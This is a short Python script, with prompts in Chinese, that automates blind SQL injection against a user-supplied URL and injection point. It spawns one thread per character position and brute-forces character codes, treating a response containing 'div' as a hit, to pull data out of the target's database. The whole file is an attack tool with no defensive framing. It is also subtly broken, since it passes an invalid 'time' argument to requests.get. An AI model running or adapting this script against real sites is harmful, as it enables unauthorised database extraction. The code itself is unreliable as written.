import requests
import threading
import warnings
warnings.filterwarnings("ignore")
result=int(input("输入查找长度"))
url = input("输入url及注入点")
data=input("输入注入语句")
def fun(url,result,result2):
    for i in range(result2):
        # try:
            reponse=requests.get(url+data.format(result,i),time=0.5)
            if 'div' in reponse.text:
                print(result,url+data.format(result,i),chr(i))
                break
        # except:
        #     print("error\n")
        #     continue
    return
for  i in range(result):
    t=threading.Thread(target=fun,args=(url,i,150))
    t.start()